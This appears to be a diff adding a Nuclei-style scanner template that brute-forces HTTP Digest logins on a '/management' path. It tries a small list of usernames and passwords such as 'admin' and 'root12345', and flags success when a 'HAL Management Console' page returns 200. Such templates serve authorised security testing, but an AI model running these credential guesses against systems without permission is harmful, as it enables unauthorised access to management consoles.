@@ -1,0 +1,46 @@
+id: digest-brute
+
+info:
+  name: Brute Force login
+  author: sc5003
+  severity: high
+  description: |
+    Digest Authentication brute force attack 
+  reference:
+    - https://to-do
+
+requests:
+  - raw:
+      - |
+        GET /management HTTP/1.1
+        Host: {{Hostname}}
+
+    digest-username: "{{param_a}}"
+    digest-password: "{{param_b}}"
+
+    payloads:
+      param_a:
+        - admin
+        - eladmin
+      param_b:
+        - abc123
+        - root12345
+
+    attack: clusterbomb
+
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        part: body
+        words:
+          - "HAL Management Console"
+
+            #- type: word
+            #part: header
+            #words:
+            #- "application/json"
+
+      - type: status
+        status:
+          - 200
